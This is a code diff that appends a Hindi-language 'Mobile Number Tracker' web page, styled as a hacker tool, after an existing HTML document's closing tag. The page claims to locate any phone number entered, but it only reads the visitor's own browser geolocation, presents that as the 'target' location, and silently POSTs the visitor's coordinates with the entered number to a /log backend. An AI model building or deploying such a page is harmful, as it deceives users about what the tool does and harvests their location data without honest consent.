@@ -87,3 +87,88 @@
   </script>
 </body>
 </html>
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8">
+  <title>HackmanX-IP-Tracker</title>
+  <link rel="stylesheet" href="/static/style.css">
+  <style>
+    body {
+      background-color: black;
+      color: lime;
+      font-family: monospace;
+      text-align: center;
+      padding-top: 50px;
+    }
+    input, button {
+      font-size: 1em;
+      padding: 8px;
+      margin-top: 10px;
+      background-color: #111;
+      color: lime;
+      border: 1px solid lime;
+    }
+    #location, #timestamp, #error {
+      margin-top: 20px;
+      font-size: 1.2em;
+    }
+    #map-link {
+      margin-top: 10px;
+      display: block;
+      color: cyan;
+    }
+  </style>
+</head>
+<body>
+  <h1>📱 Mobile Number Tracker</h1>
+  <input type="text" id="mobile" placeholder="मोबाइल नंबर दर्ज करें">
+  <br>
+  <button onclick="trackLocation()">🔍 स्थान ट्रैक करें</button>
+
+  <p id="location"></p>
+  <p id="timestamp"></p>
+  <a id="map-link" href="#" target="_blank"></a>
+  <p id="error" style="color: red;"></p>
+
+  <script>
+    function trackLocation() {
+      const mobile = document.getElementById("mobile").value;
+      if (!mobile || mobile.length < 10) {
+        document.getElementById("error").innerText = "❌ कृपया वैध मोबाइल नंबर दर्ज करें।";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const now = new Date().toLocaleString('hi-IN');
+
+        // Show location
+        document.getElementById("location").innerText = "📍 स्थान: " + lat + ", " + lon;
+        document.getElementById("timestamp").innerText = "🕒 समय: " + now;
+        document.getElementById("map-link").innerText = "🗺️ Google Map पर देखें";
+        document.getElementById("map-link").href = `https://www.google.com/maps?q=${lat},${lon}`;
+        document.getElementById("error").innerText = "";
+
+        // Send to backend
+        fetch('/log', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ mobile: mobile, lat: lat, lon: lon })
+        });
+
+        // Sound + narration
+        let audio = new Audio('/static/sound/target_found.mp3');
+        audio.play();
+        let speech = new SpeechSynthesisUtterance("लक्ष्य स्थान सफलतापूर्वक प्राप्त हुआ");
+        speech.lang = "hi-IN";
+        window.speechSynthesis.speak(speech);
+      },
+      err => {
+        document.getElementById("error").innerText = "❌ स्थान प्राप्त नहीं हो सका। कृपया अनुमति दें।";
+      });
+    }
+  </script>
+</body>
+</html>
